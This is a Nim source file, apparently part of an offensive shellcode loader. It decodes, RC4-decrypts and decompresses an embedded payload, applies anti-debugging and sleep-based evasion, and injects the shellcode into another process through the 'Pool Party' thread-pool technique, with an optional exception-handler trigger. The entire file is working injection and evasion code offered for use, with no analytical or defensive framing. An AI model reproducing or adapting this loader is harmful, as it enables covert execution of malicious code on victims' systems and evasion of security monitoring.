# Internal
import params
import antidebug
include helpers

const STATUS_INTEGER_DIVIDE_BY_ZERO = 0xC0000094

# Raising VEH
{.emit: """
#include <windows.h>
void raiseVEH() {
    int x = 4 / 0;
}
""".}
proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}


proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncrypted: bool): bool =
        
    # Sleep at execution
    sleepUselessCalculations(sleepSeconds)

    # Anti debug check
    if antiDebugAction in[protectString("die"), protectString("troll")] and isDebugged():
        if antiDebugAction == protectString("die"):
            quit(1)
        elif antiDebugAction == protectString("troll"):
            sleepUselessCalculations(999999999)

    # Decode, (Decrypt) and decompress shellcode
    let commandLineParams = commandLineParams()
    var decodedPayload = decode(payload)
    var shellcodeStr: string
    var isKeySupplied = false
    if isEncrypted:
        for i in commandLineParams:
            if i.startsWith(protectString("-K:")) and len(i) > 3:
                isKeySupplied = true
                var key = i.replace(protectString("-K:"), "")
                try:
                    shellcodeStr = uncompress(fromRC4(key, decodedPayload))
                except SnappyError: # Wrong RC4 key
                    quit(1)
        if not isKeySupplied:
            quit(1)
    else:
        shellcodeStr = uncompress(decodedPayload)

    # Converting shellcode
    var shellcodeBytes = @(shellcodeStr.toOpenArrayByte(0, shellcodeStr.high))
    var shellcodeBytesPtr = addr shellcodeBytes[0]
    
    # Enabling debug privilege
    discard setDebugPrivilege()

    # Get target PID
    var targetPid = getPid(processName)
    if targetPid == 0 and waitForProcess:
        while targetPid == 0:
            targetPid = getPid(processName)
            Sleep(10 * 1000)

    # Opening target process
    var targetHandle = OpenProcess(
        PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_DUP_HANDLE or PROCESS_QUERY_INFORMATION,
        FALSE,
        cast[DWORD](targetPid)
        )
    if targetHandle == 0:
        quit(1)

    # Allocating memory in target process
    let targetPtr = VirtualAllocEx(
        targetHandle,
        NULL,
        cast[SIZE_T](shellcodeBytes.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
    if cast[int](targetPtr) == 0:
        quit(1)

    # Writing shellcode to target process
    var bytesWritten: SIZE_T
    WriteProcessMemory(
        targetHandle, 
        targetPtr,
        shellcodeBytesPtr,
        cast[SIZE_T](shellcodeBytes.len),
        addr bytesWritten
    )
    if bytesWritten == 0:
        quit(1)
    # echo "Remote shellcode: " & $cast[int](targetPtr).toHex

    # Pool Party variant 7
    var direct: TP_DIRECT
    direct.Callback = targetPtr
    var remoteDirectAddress: PTP_DIRECT = cast[PTP_DIRECT](VirtualAllocEx(
        targetHandle, 
        NULL, 
        sizeof(TP_DIRECT), 
        MEM_COMMIT or MEM_RESERVE, 
        PAGE_READWRITE
    ))
    if cast[int](remoteDirectAddress) == 0:
        quit(1)
    WriteProcessMemory(
        targetHandle,
        remoteDirectAddress,
        addr direct,
        sizeof(TP_DIRECT),
        addr bytesWritten
    )
    if bytesWritten == 0:
        quit(1)
    # echo "Remote TP_DIRECT: " & $cast[int](remoteDirectAddress).toHex
    var ioCompletionHandle = hijackProcessHandle(newWideCString(protectString("IoCompletion")), targetHandle, IO_COMPLETION_ALL_ACCESS)
    NtSetIoCompletion(ioCompletionHandle, remoteDirectAddress, NULL, 0, 0)


proc wrapExecute() =
    discard execute(
        payload = payload, 
        processName = processName,
        sleepSeconds = sleepSeconds,
        isEncrypted = isEncrypted
    )
    quit(0)


proc wrapExecuteVEH(pExceptInfo: PEXCEPTION_POINTERS): LONG =
    if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](STATUS_INTEGER_DIVIDE_BY_ZERO)): 
        wrap_execute()
    else:
        return EXCEPTION_CONTINUE_SEARCH


proc main*() =
    if isVeh:
        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrapExecuteVEH))
        raiseVEH()
    else:
        wrapExecute()


when isMainModule:
    main()